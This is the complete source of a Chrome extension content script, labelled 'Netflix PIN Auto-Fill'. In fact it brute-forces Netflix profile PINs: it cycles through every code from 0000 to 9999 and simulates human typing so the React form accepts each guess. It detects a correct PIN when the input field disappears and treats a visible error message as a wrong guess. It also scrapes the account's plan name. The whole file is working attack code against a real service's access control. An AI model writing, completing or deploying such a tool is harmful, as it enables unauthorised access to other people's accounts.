// Credit: REVERSE
console.log('Netflix PIN Auto-Fill content.js loaded (React compatible)');

function formatPin(num) {
  return num.toString().padStart(4, '0');
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function sendStatus(message, pinString = null) {
  try {
    chrome.runtime.sendMessage({action: 'statusUpdate', status: message, pinString});
  } catch (error) {
    console.warn('ไม่สามารถส่งสถานะไป popup ได้', error);
  }
}

// React-compatible input value setter
function setNativeInputValue(element, value) {
  const nativeSetter = Object.getOwnPropertyDescriptor(
    window.HTMLInputElement.prototype, 'value'
  ).set;
  nativeSetter.call(element, value);
  element.dispatchEvent(new Event('input', { bubbles: true }));
  element.dispatchEvent(new Event('change', { bubbles: true }));
}

async function simulateHumanType(element, text, delayPerChar) {
  if (!element) return;

  console.log(`พิมพ์: ${text} ลงใน element (React compatible)`);

  // Focus the element
  element.focus();
  element.dispatchEvent(new Event('focus', { bubbles: true }));

  // Clear existing value
  setNativeInputValue(element, '');

  for (let i = 0; i < text.length; i++) {
    const char = text[i];

    // Dispatch keyboard events first (React listens for these)
    element.dispatchEvent(new KeyboardEvent('keydown', {
      bubbles: true,
      cancelable: true,
      key: char,
      code: `Digit${char}`,
      keyCode: char.charCodeAt(0),
      which: char.charCodeAt(0)
    }));
    element.dispatchEvent(new KeyboardEvent('keypress', {
      bubbles: true,
      cancelable: true,
      key: char,
      code: `Digit${char}`,
      charCode: char.charCodeAt(0)
    }));

    // Set value via native setter (React-compatible)
    const currentValue = element.value || '';
    setNativeInputValue(element, currentValue + char);

    element.dispatchEvent(new KeyboardEvent('keyup', {
      bubbles: true,
      cancelable: true,
      key: char,
      code: `Digit${char}`,
      keyCode: char.charCodeAt(0),
      which: char.charCodeAt(0)
    }));

    await sleep(delayPerChar);
  }

  element.dispatchEvent(new Event('blur', { bubbles: true }));
}

async function pressEnter(element) {
  if (!element) return;

  element.dispatchEvent(new KeyboardEvent('keydown', {
    bubbles: true,
    cancelable: true,
    key: 'Enter',
    code: 'Enter',
    keyCode: 13,
    which: 13
  }));
  element.dispatchEvent(new KeyboardEvent('keypress', {
    bubbles: true,
    cancelable: true,
    key: 'Enter',
    code: 'Enter',
    charCode: 13
  }));
  element.dispatchEvent(new KeyboardEvent('keyup', {
    bubbles: true,
    cancelable: true,
    key: 'Enter',
    code: 'Enter',
    keyCode: 13,
    which: 13
  }));
}

function findPinInputs() {
  const INPUT_SELECTORS = [
    'input[data-uia="login-pin-input"]',
    '.pin-input',
    '.pin-number-input',
    'input[type="password"]',
    'input[maxlength="4"]',
    'input[data-uia*="pin" i]',
    'input[aria-label*="PIN" i]',
    'input[aria-label*="pin" i]',
    'input[placeholder*="PIN" i]',
    'input[placeholder*="pin" i]'
  ];

  for (const selector of INPUT_SELECTORS) {
    const inputs = document.querySelectorAll(selector);
    if (inputs.length > 0) {
      console.log(`พบ ${inputs.length} input fields ด้วย selector: ${selector}`);
      return Array.from(inputs);
    }
  }

  return [];
}

async function waitForPinInputs(maxWait = 8000) {
  const start = Date.now();
  while (Date.now() - start < maxWait) {
    const inputs = findPinInputs();
    if (inputs.length > 0) return inputs;
    await sleep(300);
  }
  return [];
}

function isPinInRange(pin) {
  return pin >= 0 && pin <= 9999;
}

function getSortOrderLabel(sortOrder) {
  return sortOrder === 'desc' ? 'มากไปน้อย' : 'น้อยไปมาก';
}

async function mainLoop(config) {
  const startPin = Number.isFinite(Number(config.startPin)) ? parseInt(config.startPin, 10) : 0;
  let currentPin = Math.min(Math.max(isNaN(startPin) ? 0 : startPin, 0), 9999);
  const sortOrder = config.sortOrder === 'desc' ? 'desc' : 'asc';
  const pinStep = sortOrder === 'desc' ? -1 : 1;

  let keyDelay = Number.isFinite(Number(config.keyDelay)) ? parseInt(config.keyDelay, 10) : 80;
  let codeDelay = Number.isFinite(Number(config.codeDelay)) ? parseInt(config.codeDelay, 10) : 120;
  keyDelay = Math.max(10, isNaN(keyDelay) ? 80 : keyDelay);
  codeDelay = Math.max(30, isNaN(codeDelay) ? 120 : codeDelay);

  sendStatus(`เริ่มทำงานจาก PIN: ${formatPin(currentPin)} (${getSortOrderLabel(sortOrder)})`, formatPin(currentPin));
  console.log(`Config: keyDelay=${keyDelay}ms, codeDelay=${codeDelay}ms, sort=${sortOrder}, start=${currentPin}`);

  while (isPinInRange(currentPin) && window.isRunning) {
    const pinString = formatPin(currentPin);
    console.log(`รอบที่ ${currentPin}: กำลังทดลองรหัส ${pinString}`);
    sendStatus('กำลังทดลองรหัส', pinString);

    // Wait for pin inputs to be available
    const pinInputs = await waitForPinInputs(5000);

    if (pinInputs.length === 0) {
      console.log('ไม่พบช่องกรอก PIN - หน้าเว็บอาจเปลี่ยนไปแล้ว');
      // Check if we got redirected (success)
      const urlInputs = findPinInputs();
      if (urlInputs.length === 0) {
        // Still no inputs after re-check → might be on a different page
        sendStatus('ไม่พบหน้าจอกรอก PIN — อาจเข้าสู่ระบบแล้วหรือหน้าเปลี่ยน', pinString);
        window.isRunning = false;
        break;
      }
      // Inputs appeared, continue
      continue;
    }

    // Type PIN into inputs
    if (pinInputs.length === 1) {
      await simulateHumanType(pinInputs[0], pinString, keyDelay);
      // Press Enter to submit
      await sleep(200);
      await pressEnter(pinInputs[0]);
    } else if (pinInputs.length >= 4) {
      for (let i = 0; i < 4; i++) {
        await simulateHumanType(pinInputs[i], pinString[i], keyDelay);
      }
      // Press Enter on last input to submit
      await sleep(200);
      await pressEnter(pinInputs[3] || pinInputs[pinInputs.length - 1]);
    } else {
      // 2-3 inputs: type all 4 digits in first field
      await simulateHumanType(pinInputs[0], pinString, keyDelay);
      await sleep(200);
      await pressEnter(pinInputs[0]);
    }

    console.log(`พิมพ์ PIN ${pinString} เสร็จ รอผลลัพธ์...`);

    // Wait configured codeDelay before checking result
    await sleep(codeDelay);

    // Poll for result
    const pollInterval = 400;
    const maxPollTime = 12000;
    const pollStart = Date.now();
    let pinResolved = false;

    while (Date.now() - pollStart < maxPollTime && window.isRunning && !pinResolved) {
      // Check if PIN inputs still exist
      const currentInputs = findPinInputs();

      // Check for error message
      const errorEl = document.querySelector(
        '.error-message, [data-uia*="error"], .pin-error-message, ' +
        '[class*="error" i], [class*="incorrect" i]'
      );

      // Success: PIN inputs disappeared → page navigated away
      if (currentInputs.length === 0) {
        // Double-check: wait briefly and re-check to avoid false positives from React re-renders
        await sleep(600);
        const recheck = findPinInputs();
        if (recheck.length === 0) {
          console.log(`เจอ PIN ถูกต้อง: ${pinString}`);
          sendStatus(`เจอ PIN ถูกต้อง: ${pinString}`, pinString);
          window.isRunning = false;
          pinResolved = true;
          break;
        }
        // Inputs came back (React re-render), continue polling
      }

      // Failure: error message visible
      if (errorEl && errorEl.offsetParent !== null) {
        const style = window.getComputedStyle(errorEl);
        if (style.display !== 'none' && style.visibility !== 'hidden') {
          console.log(`PIN ผิด: ${pinString} — ลองตัวถัดไป`);
          pinResolved = true;
          // Clear error for next attempt
          break;
        }
      }

      await sleep(pollInterval);
    }

    if (!pinResolved && window.isRunning) {
      console.log(`หมดเวลารอผล PIN ${pinString} — ลองตัวถัดไป`);
    }

    currentPin += pinStep;
  }

  if (!isPinInRange(currentPin)) {
    console.log('ลองครบทุก PIN ตามลำดับที่เลือกแล้ว');
    sendStatus('ลองครบทุก PIN แล้ว');
    window.isRunning = false;
  }
}

/* ─── Public API ─── */

function startAutoFillRoutine(config = {}) {
  if (window.isRunning) {
    sendStatus('โปรแกรมกำลังทำงานอยู่แล้ว', formatPin(window.currentPin || 0));
    return;
  }

  window.isRunning = true;
  mainLoop(config);
}

function stopAutoFillRoutine() {
  window.isRunning = false;
  console.log('หยุดโปรแกรม');
  sendStatus('หยุดการทำงานแล้ว');
}

/* ─── Plan Info ─── */

function getVisibleText(element) {
  if (!element) return '';
  return (element.innerText || element.textContent || '').replace(/\s+/g, ' ').trim();
}

function collectPlanTexts() {
  const selectors = [
    '[data-uia*="plan" i]',
    '[class*="plan" i]',
    '[id*="plan" i]',
    '[aria-label*="plan" i]',
    '[aria-label*="แพ็กเกจ" i]'
  ];

  return Array.from(document.querySelectorAll(selectors.join(',')))
    .map(getVisibleText)
    .filter(text => text.length >= 3 && text.length <= 300);
}

function collectVisibleTexts() {
  const candidates = new Set();
  const selectors = ['h1', 'h2', 'h3', 'p', 'span', 'div', 'button', 'a', 'li', 'td', 'th'];

  for (const element of document.querySelectorAll(selectors.join(','))) {
    const style = window.getComputedStyle(element);
    const rect = element.getBoundingClientRect();
    if (style.display === 'none' || style.visibility === 'hidden' || rect.width === 0 || rect.height === 0) continue;
    const text = getVisibleText(element);
    if (text.length >= 3 && text.length <= 300) candidates.add(text);
  }

  return Array.from(candidates);
}

function pickPlanName(texts) {
  const patterns = [
    {pattern: /\bStandard with ads\b/i, label: 'Standard with ads'},
    {pattern: /\bBasic with ads\b/i, label: 'Basic with ads'},
    {pattern: /\bPremium\b/i, label: 'Premium'},
    {pattern: /\bStandard\b/i, label: 'Standard'},
    {pattern: /\bBasic\b/i, label: 'Basic'},
    {pattern: /\bMobile\b/i, label: 'Mobile'},
    {pattern: /พรีเมียม/, label: 'Premium'},
    {pattern: /มาตรฐาน.*โฆษณา|โฆษณา.*มาตรฐาน/, label: 'Standard with ads'},
    {pattern: /พื้นฐาน.*โฆษณา|โฆษณา.*พื้นฐาน/, label: 'Basic with ads'},
    {pattern: /มาตรฐาน/, label: 'Standard'},
    {pattern: /พื้นฐาน/, label: 'Basic'},
    {pattern: /มือถือ/, label: 'Mobile'}
  ];

  const sortedTexts = [...texts].sort((a, b) => a.length - b.length);

  for (const {pattern, label} of patterns) {
    for (const text of sortedTexts) {
      if (pattern.test(text)) return label;
    }
  }

  return null;
}

function getPlanInfoFromPage() {
  const accountText = getVisibleText(document.body);
  const planTexts = collectPlanTexts();
  const visibleTexts = collectVisibleTexts();
  const searchTexts = [...planTexts, ...visibleTexts, accountText];
  const planName = pickPlanName(searchTexts);
  const isAccountPage = /\/account/i.test(location.pathname);

  if (!planName) {
    return {
      status: 'not-found',
      message: isAccountPage
        ? 'ไม่พบข้อมูลแพ็กเกจบนหน้า Account นี้'
        : 'กรุณาเปิดหน้า netflix.com/account ก่อน แล้วลองอีกครั้ง'
    };
  }

  return { status: 'ok', planName, pageUrl: location.href };
}

function waitForPlanInfo(timeoutMs = 10000) {
  const startedAt = Date.now();
  return new Promise((resolve) => {
    const check = () => {
      const result = getPlanInfoFromPage();
      if (result.status === 'ok' || Date.now() - startedAt >= timeoutMs) {
        resolve(result);
        return;
      }
      setTimeout(check, 500);
    };
    check();
  });
}

/* ─── Message Listener ─── */

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.command === 'startAutoFill') {
    startAutoFillRoutine(message.config);
    sendResponse({status: 'started'});
  } else if (message.command === 'stopAutoFill') {
    stopAutoFillRoutine();
    sendResponse({status: 'stopped'});
  } else if (message.command === 'getPlanInfo') {
    waitForPlanInfo().then(sendResponse);
    return true;
  }
});